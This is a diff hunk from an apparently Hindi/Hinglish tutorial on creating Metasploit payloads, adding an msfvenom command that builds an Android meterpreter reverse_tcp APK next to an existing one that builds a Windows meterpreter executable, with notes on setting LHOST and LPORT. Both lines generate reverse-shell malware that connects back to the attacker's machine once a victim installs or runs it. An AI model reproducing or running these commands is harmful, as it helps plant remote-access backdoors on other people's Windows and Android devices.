@@ -56,6 +56,7 @@ Metasploit ke saath payload banane ke liye, aapko basic steps ko follow karna ho
 
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Port> -f exe > /path/to/save/payload.exe
+   msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=4444 R > /path/to/payload.apk
    ```
    - **`LHOST`**: Aapka local IP address jisme payload connect karega (aap `ifconfig` se IP check kar sakte ho).
    - **`LPORT`**: Wo port jisme reverse connection aayega (e.g., 4444).
